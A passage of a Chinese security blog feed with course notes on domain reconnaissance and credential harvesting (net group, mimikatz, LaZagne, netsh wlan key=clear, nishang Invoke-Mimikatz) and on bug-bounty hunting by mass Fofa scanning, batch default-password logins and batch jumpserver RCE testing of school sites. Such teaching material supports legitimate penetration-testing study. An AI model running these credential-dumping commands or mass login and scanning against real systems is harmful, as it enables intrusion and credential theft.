class="line">net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br></pre></td></tr></table></figure><p>收集用户信息的作用：</p><ul><li>先找到域用户名，为后续进行密码账号的攻击做准备，后续攻击是可以用这些真实的用户名套用密码字典进行暴力破解，一旦找到对应的密码就可以登录计算机进行后续操作。看看用户名在哪个组，我就有什么权限。</li></ul><p>&lt;1&gt;net user 获取当前电脑里面的用户（本地用户），对于本地用户，当前计算机可通过用户名密码登录。</p><p>net user &#x2F;domain 获取当前域里面的用户，对于域用户，当前计算机是否可登录，受活动目录限制，若权限不够，是不能登录的。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-9.png" alt="65-1"></p><p>&lt;2&gt;net localgroup 本地用户组</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-10.png" alt="65-1"></p><p>&lt;3&gt;net group &#x2F;domain 获取域用户组信息</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-11.png" alt="65-1"></p><p>&lt;4&gt;wmic useraccount get &#x2F;all 涉及域用户详细信息</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-12.png" alt="65-1"></p><p>&lt;5&gt;net group “Domain Admins” &#x2F;domain 查询域管理员账户</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-13.png" alt="65-1"></p><p>&lt;6&gt;net group “Domain users” &#x2F;domain 查询域用户</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-14.png" alt="65-1"></p><p><strong>案例4：凭据信息收集操作演示（非常重要）</strong></p><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">计算机用户HASH，明文获取   -mimikatz（win），mimipenguin（linux）</span><br><span class="line">计算机各种协议服务口令获取   -LaZagne（all,win&amp;linux），XenArmor（win）</span><br><span class="line"> </span><br><span class="line">Netsh WLAN show profiles  //查询所有连接过的wifi名称</span><br><span class="line">Netsh WLAN show profile name =&quot;无线名称&quot; key =clear  //查询某wifi密码</span><br><span class="line"> </span><br><span class="line">获取凭据的方法：</span><br><span class="line">1.站点源码备份文件，数据库备份文件等</span><br><span class="line">2.各类数据库WEB管理入口，如PHPmyadmin</span><br><span class="line">3.浏览器保存密码，浏览器cookies</span><br><span class="line">4.其他用户会话，3389和ipc$连接记录，回收站内容</span><br><span class="line">5.windows 保存的WIFI密码</span><br><span class="line">6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</span><br></pre></td></tr></table></figure><p>人能够记住的密码有限，所以一般用户习惯给很多网站、服务等设置相同的或者类似的密码，所以当你找到了一个密码，其他密码很有可能被猜解到。</p><p>1、获取计算机用户名密码 mimikatz &amp; mimipenguin</p><ul><li>mimikatz下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li><li>mimipenguin下载：<a href="https://github.com/huntergregal/mimipenguin/releases/">https://github.com/huntergregal/mimipenguin/releases/</a></li></ul><p>新版mimikatz貌似运行有问题，下面是旧版运行结果，获取到了明文密码。注意：mimikatz运行需要域管理员权限，域用户无法运行，因为权限不够。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-15.png" alt="65-1"></p><p>同样，mimipenguin运行需要root权限，普通用户无法运行。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-16.png" alt="65-1"></p><p>2、获取计算机各种协议服务口令 LaZagne（all,win&amp;linux） &amp; XenArmor（win）</p><p>LaZagne</p><ul><li>优点：免费；自动化脚本；支持win&amp;linux</li><li>缺点：很多密码都获取不到，不好用</li><li>下载：<a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-17.png" alt="65-1"></p><p>XenArmor</p><ul><li>国外软件，价格40-50美元，网上可能有破解版，不过是老版</li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/65-18.png" alt="65-1"></p><p>这两个软件主要是通过自动化翻找以下内容，从而获取凭据。</p><ul><li>1.站点源码备份文件，数据库备份文件等</li><li>2.各类数据库WEB管理入口，如PHPmyadmin</li><li>3.浏览器保存密码，浏览器cookies</li><li>4.其他用户会话，3389和ipc$连接记录，回收站内容</li><li>5.windows 保存的WIFI密码</li><li>6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</li></ul><p><strong>案例5-探针主机域控架构服务操作演示</strong></p><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、探针域控制器名及地址信息</span><br><span class="line">net time /domain</span><br><span class="line">nslookup &lt;域控名称&gt;</span><br><span class="line">ping &lt;域控名称&gt;</span><br><span class="line">  </span><br><span class="line">2、探针域内存活主机及地址信息</span><br><span class="line">nbtscan 192.168.3.0/24 第三方工具（老牌工具，说实在没必要用这个工具，不强大！不免杀！）</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL =&quot; 自带内部命令（推荐使用）</span><br><span class="line">其他：nmap，masscan，第三方Powershell脚本nishang、empire等（个人喜欢NiShang）</span><br></pre></td></tr></table></figure><p>nbtscan下载：<a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a></p><p>NiShang简介：</p><p>Powershell用于渗透测试其实早在多年前就已经被提出了。利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。（类似于MSF）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;下载NiShang：https://github.com/samratashok/nishang</span><br><span class="line">&lt;2&gt;进入目录，执行以下命令</span><br><span class="line">Import-Module ./nishang.psml        导入模块nishang</span><br><span class="line">set-ExecutionPolicy RemoteSigned    设置执行策略</span><br><span class="line">Get-Command -Module nishang     获取模块nishang的命令函数（有很多命令函数分别执行不同功能，比如以下命令）</span><br><span class="line">Get-information             获取常规计算机信息</span><br><span class="line">Invoke-Mimikatz             获取计算机用户名密码</span><br><span class="line">Invoke-Portscan -startaddress 192.168.3.0 -Endaddress 192.168.3.100 -ResolveHost -ScanPort  端口扫描（查看目录对应文件有演示语法，其他同理）</span><br><span class="line">其他功能：删除补丁，反弹shell，凭据获取等</span><br></pre></td></tr></table></figure><p>探针域内主机角色及服务信息</p><ul><li>利用开放端口服务及计算机名判断</li><li>核心业务机器：<ul><li>1.高级管理人员，系统管理员，财务&#x2F;人事、业务人员的个人计算机</li><li>2.产品管理系统服务器</li><li>3.办公系统服务器</li><li>4.财务应用系统服务器</li><li>5.核心产品源码服务器</li><li>6.数据库服务器</li><li>7.文件或者网盘服务器</li><li>8.电子邮件服务器</li><li>9.网络监控系统服务器</li><li>10.其他服务器（内部技术文档服务器，其他监控服务器）</li></ul></li></ul><p>其他涉及资源：</p><ul><li><a href="https://nagareshwar.securityxploded.com/download-softwares/">https://nagareshwar.securityxploded.com/download-softwares/</a></li><li><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></li><li>红队实战演练环境：<a href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug</a> 提取码: taqu</li></ul><p>参考：<br><a href="https://blog.csdn.net/Waffle666/article/details/120157352">https://blog.csdn.net/Waffle666/article/details/120157352</a><br><a href="https://baijiahao.baidu.com/s?id=1697474162209043682&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1697474162209043682&amp;wfr=spider&amp;for=pc</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;65-内网安全-域环境&amp;amp;工作组&amp;amp;局域网探针方案&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%8B%BF%E4%B8%8BCNVD%E8%AF%81%E4%B9%A6%E5%BC%80%E6%BA%90&amp;%E9%97%AD%E6%BA%90&amp;%E5%94%AE%E5%8D%96%E7%B3%BB%E7%BB%9F/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%8B%BF%E4%B8%8BCNVD%E8%AF%81%E4%B9%A6%E5%BC%80%E6%BA%90&amp;%E9%97%AD%E6%BA%90&amp;%E5%94%AE%E5%8D%96%E7%B3%BB%E7%BB%9F/</id>
    <published>2023-05-23T15:27:29.466Z</published>
    <updated>2023-06-06T15:38:33.196Z</updated>
    
    <content type="html"><![CDATA[<p>88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统</p><span id="more"></span><p>思维导图</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-1.png" alt="88-1"></p><p><strong>知识点：通用漏洞：100+ip部署该系统</strong></p><p>1、通用漏洞分类：开源系统、闭源系统、售卖系统</p><ul><li><p>分类、解释、区别</p></li><li><ul><li>开源系统：可以拿到源码</li><li>闭源系统：一般拿不到源码</li><li>售卖系统：可能拿到源码，也可能拿不到</li></ul></li></ul><p>2、如何寻找上述三类系统并进行安全测试</p><ul><li>开源：各大源码站下载代码审计</li><li>闭源：Fofa搜索尝试获取源码审计或黑盒测试</li><li>售卖：套路社工获取源码或购买源码审计或黑盒测试</li><li>确定无源码的情况下，可利用JS文件寻找测试接口</li></ul><p>3、如何挑简单的入手最快速度获取证书</p><ul><li>目前Java难度最大，py项目较少，挑php，aspx入手</li><li>其中php代码清晰明了，前期讲过，aspx涉及反编译代码后审计。</li></ul><p><strong>知识点：部分web源码获取</strong></p><p>1、常见的Web源码泄漏漏洞及其利用</p><ul><li><p>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a></p></li><li><p>Web源码泄露的漏洞：</p></li><li><ul><li>git源码泄露</li><li>svn源码泄露</li><li>hg源码泄漏</li><li>网站备份压缩文件</li><li>WEB-INF&#x2F;web.xml 泄露</li><li>DS_Store 文件泄露</li><li>SWP 文件泄露</li><li>CVS泄露</li><li>Bzr泄露</li><li>GitHub源码泄漏</li></ul></li></ul><p>2、黑白源码站的利用价值、存在意义、区分对待</p><p>技术点：各种语言代码审计，无源码除常规安全测试外，js下的测试口等</p><p><strong>案例1：某开源逻辑审计配合引擎实现通用</strong></p><p>1.尝试逻辑测试</p><p>&lt;1&gt;在源码网站下载一个PHP源码，找一个人气比较高的</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-2.png" alt="88-1"></p><p>&lt;2&gt;在挖漏洞之前，确定一下该系统的影响范围。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-3.png" alt="88-1"></p><p>在fofa上搜索一下关键词（这里选的是后台地址），发现了178条匹配结果，说明影响范围100+，可以挖一下。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-4.png" alt="88-1"></p><p>换个关键词搜索，搜出来的结果更多</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-5.png" alt="88-1"></p><p>&lt;3&gt;本地安装运行一下</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-6.png" alt="88-1"></p><p>&lt;4&gt;在安装过程中发现一个逻辑漏洞，安装过程中系统并未让用户手动配置后台用户名密码，说明系统的后台用户名密码是默认的，admin&#x2F;admin123，这样造成的后果是，总有粗心的管理员后续忘记修改后台默认密码。</p><p>&lt;5&gt;使用python脚本批量爬一下，网上有多少网站使用了该系统</p><p>脚本</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-7.png" alt="88-1"></p><p>结果</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-8.png" alt="88-1"></p><p>&lt;6&gt;再写一个python脚本，使用默认密码，批量登录这些网站的后台，看是否登录成功。登录成功则存在弱口令。</p><p>脚本</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-9.png" alt="88-1"></p><p>结果<br><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-10.png" alt="88-1"></p><p>可以随便取一个结果在浏览器中登录一下试试。</p><p>2.尝试漏洞挖掘</p><p>&lt;7&gt;再挖个漏洞看看，将源码放到seay系统中，自动审计一下试试</p><p>有些漏洞位置在后台目录下，这些漏洞的利用前提是需要后台权限，意义不大，可忽略</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-11.png" alt="88-1"></p><p>&lt;8&gt;代码审计，发现一个SQL注入漏洞</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-12.png" alt="88-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-13.png" alt="88-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-14.png" alt="88-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-15.png" alt="88-1"></p><p><strong>案例2：某闭源审计或黑盒配合引擎实现通用</strong></p><p>&lt;1&gt;在源码网站下载一个.net源码，找一个人气比较高的</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-16.png" alt="88-1"></p><p>&lt;2&gt;在源码的bin目录下有很多dll文件，使用dnSpy工具打开这些dll文件即可查看其源码，接下来审计源码即可。</p><ul><li>dnSpy-net-win32.zip下载：<a href="https://fletime.lanzoux.com/iDxcCj60qlc">https://fletime.lanzoux.com/iDxcCj60qlc</a></li><li>dnSpy-net-win64.zip下载：<a href="https://fletime.lanzoux.com/iP8sCj60scf">https://fletime.lanzoux.com/iP8sCj60scf</a></li><li>dnSpy-netframework.zip下载：<a href="https://fletime.lanzoux.com/i3kGmj5yqwb">https://fletime.lanzoux.com/i3kGmj5yqwb</a></li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-17.png" alt="88-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-18.png" alt="88-1"></p><p><strong>案例3：某售卖审计或黑盒配合引擎实现通用</strong></p><p>通用步骤：</p><p>1.尝试性获取源码</p><p>2.类似java或.net编译类文件反编译源码-dnspy,idea</p><p>3.无源码情况下的JS接口数据提交测试模拟-jsdinder,手工，扫描</p><p>案例演示</p><p>&lt;1&gt;搜索一个系统</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-18.png" alt="88-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-19.png" alt="88-1"></p><p>&lt;2&gt;这个系统无源码，也不知道是个啥系统，怎么测试呢？除了以前学过的常规黑盒测试外，还可以这么测</p><p>使用jsfinder工具，扫描js文件，爬取系统中的一些地址，从而获取更多信息，扩大测试范围</p><ul><li>JSFinder下载：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-20.png" alt="88-1"></p><p>还可以御剑配合字典扫描js目录</p><p>字典</p><ul><li>fuzzDicts下载：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></li></ul><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-21.png" alt="88-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-22.png" alt="88-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/88-23.png" alt="88-1"></p><p>注意：以上均是思路演示，不可以真的拿真实系统去测，要做一个遵纪守法好公民！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;88-SRC挖掘-拿下CNVD证书开源&amp;amp;闭源&amp;amp;售卖系统&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E5%B9%B3%E5%8F%B0&amp;%E8%A7%84%E5%88%99&amp;%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86%EF%BC%9ASRC%E6%8C%96%E6%8E%98-%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E5%B9%B3%E5%8F%B0&amp;%E8%A7%84%E5%88%99&amp;%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96/</id>
    <published>2023-05-23T15:17:30.681Z</published>
    <updated>2023-06-06T15:38:28.657Z</updated>
    
    <content type="html"><![CDATA[<p>86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</p><span id="more"></span><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-1.png" alt="86-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-2.png" alt="86-1"></p><p><strong>案例1：Python-Foda-Xray联动常规批量自动化</strong></p><p>写Python脚本，将教育行业漏洞报告平台上的所有学校都爬下来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_edu_name</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">196</span>):</span><br><span class="line">        url = <span class="string">&quot;https://src.sjtu.edu.cn/rank/firm/?page=&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.get(url).content.decode(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">            soup = etree.HTML(result)</span><br><span class="line">            name = soup.xpath(<span class="string">&#x27;//td[@class=&quot;am-text-center&quot;]/a/text()&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            name = <span class="string">&#x27;\n&#x27;</span>.join(name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;edu_name.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(name +<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_edu_name()</span><br></pre></td></tr></table></figure><p>或者也可以在fofa上搜索（需要买会员）</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-3.png" alt="86-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-4.png" alt="86-1"></p><p>结果爬下来173861个教育网站地址。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-5.png" alt="86-1"></p><p>域名都爬下来之后，用xray，awvs等工具进行批量测试。</p><p><strong>案例2：Python-Foda-Exploit联动定点批量自动化</strong></p><p>在seebug（<a href="https://www.seebug.org/%EF%BC%89%E4%B8%8A%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E6%96%B0%E7%9A%84%E6%9C%89POC%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%AF%B9POC%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E4%BD%BF%E4%B9%8B%E5%8F%AF%E4%BB%A5%E6%89%B9%E9%87%8F%E6%B5%8B%E8%AF%95%E3%80%82%E6%AF%94%E5%A6%82jumpserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">https://www.seebug.org/）上找到一个最新的有POC的漏洞，对POC二次开发使之可以批量测试。比如jumpserver远程命令执行漏洞</a></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-6.png" alt="86-1"></p><p>在fofa上搜索使用jumpserver的教育行业网站，找到3个网站使用了jumpserver。</p><p><img 